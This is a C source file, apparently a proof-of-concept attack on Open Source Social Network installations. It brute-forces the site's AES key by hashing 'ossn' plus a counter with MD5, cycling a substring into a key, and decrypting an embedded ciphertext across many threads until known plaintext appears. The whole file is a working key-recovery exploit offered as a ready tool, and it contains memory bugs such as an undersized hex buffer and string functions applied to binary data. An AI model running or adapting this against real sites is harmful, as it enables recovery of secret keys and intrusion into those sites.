#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <openssl/md5.h>
#include <unistd.h>
#include "base64/base64.h"
#include "tiny-AES-c/aes.h"

#define IV_LENGTH 16
#define KEY_LENGTH 16
#define CIPHERTEXT_LENGTH 1024
#define SUBSTR_START 3
#define SUBSTR_LENGTH 8

struct generator_args {
    long min;
    long max;
};

pthread_mutex_t lock;
int attempts_per_second = 0;
int key_found = 0;
unsigned char iv[IV_LENGTH];
unsigned char ciphertext[CIPHERTEXT_LENGTH];
const char *encrypted_blob = "j6B0RXNQYc0fDymm7hrkLODhEFgxV6HlXsY4qVndNkRyhQjCY98huD6i2t30X2Uh";

unsigned char* build_cycled_key(char* key) {
    unsigned char *cycled_key = malloc(KEY_LENGTH + 1);
    memset(cycled_key, 0, KEY_LENGTH + 1);

    while (strlen(cycled_key) < KEY_LENGTH) {
        int concat_size = KEY_LENGTH - strlen(cycled_key);

        if (concat_size > strlen(key)) {
            concat_size = strlen(key);
        }

        strncat(cycled_key, key, concat_size);
    }

    return cycled_key;
}

void *test_attempt(void *args) {
    pthread_mutex_lock(&lock);
    attempts_per_second++;
    pthread_mutex_unlock(&lock);
    unsigned char *key = build_cycled_key((char *)args);
    unsigned char buffer[CIPHERTEXT_LENGTH];
    struct AES_ctx ctx;

    strcpy(buffer, ciphertext);
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, buffer, strlen(buffer));

    if (strstr(buffer, "tmp/photos") != NULL) {
        printf("Key found: %s Message: %s\n", key, buffer);
        pthread_mutex_lock(&lock);
        key_found = 1;
        pthread_mutex_unlock(&lock);
    }

    free(key);
    free(args);
}

void *attempt_generator(void *arguments) {
    struct generator_args *args = malloc(sizeof(struct generator_args));
    args = arguments;
    pthread_t threads[5000];
    int thread_index = 0;

    for (long i = args->min; i <= args->max; i++) {
        if (key_found) {
            return;
        }

        char *string = malloc(256);
        unsigned char hash[MD5_DIGEST_LENGTH];
        char *attempt = malloc(SUBSTR_LENGTH + 1);
        char *hash_hex = malloc(32);
        
        memset(string, 0, 256);
        memset(attempt, 0, SUBSTR_LENGTH + 1);
        memset(hash_hex, 0, 32);
        sprintf(string, "ossn%ld", i);
        MD5(string, strlen(string), hash);

        for (int j = 0; j < MD5_DIGEST_LENGTH; j++) {
            hash_hex += sprintf(hash_hex, "%02x", hash[j]);
        }

        hash_hex -= 32;
        strncpy(attempt, hash_hex + SUBSTR_START, SUBSTR_LENGTH);
        pthread_create(&threads[thread_index], NULL, test_attempt, attempt);
       
        if (thread_index == 4999) {
            for (int j = 0; j < sizeof(threads) / sizeof(threads[0]); j++) {
                pthread_join(threads[j], NULL);
            }

            thread_index = 0;
        } else {
            thread_index++;
        }

        free(string);
        free(hash_hex);
    }

    for (int i = 0; i < sizeof(threads) / sizeof(threads[0]); i++) {
        pthread_join(threads[i], NULL);

        if (key_found) {
            return;
        }
    }
}

void *progress_thread() {
    time_t base_time = time(NULL);

    while (1) {
        if (key_found) {
            return;
        } else if (difftime(time(NULL), base_time) >= 1.0) {
            printf("Attempts per second: %d\n", attempts_per_second);
            base_time = time(NULL);
            pthread_mutex_lock(&lock);
            attempts_per_second = 0;
            pthread_mutex_unlock(&lock);
        } else {
            usleep(100 * 1000);
        }
    }
}

void extract_iv_ciphertext() {
    unsigned char decoded_blob[strlen(encrypted_blob)];
    b64_decode(encrypted_blob, strlen(encrypted_blob), decoded_blob);
    strncpy(iv, decoded_blob, IV_LENGTH);
    strcpy(ciphertext, decoded_blob + IV_LENGTH);
}

void start_generators(long max_value, int thread_count) {
    pthread_t threads[thread_count];
    struct generator_args args[thread_count];

    while (max_value % thread_count != 0) {
        max_value++;
    }
    
    for (int i = 0; i < thread_count; i++) {
        args[i].max = (max_value / thread_count) * (i + 1);
        args[i].min = (max_value / thread_count) * i;

        if (args[i].min > 0) {
            args[i].min++;
        }

        pthread_create(&threads[i], NULL, attempt_generator, &args[i]);
    }
   
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
}

int main() {
    setbuf(stdout, NULL);
    time_t start_time = time(NULL);
    pthread_t progress_monitor;
    pthread_create(&progress_monitor, NULL, progress_thread, NULL);
    extract_iv_ciphertext();
    start_generators(2147483647, 4);
    pthread_join(progress_monitor, NULL);
    printf("Time taken: %f\n", difftime(time(NULL), start_time));
    return 0;
}
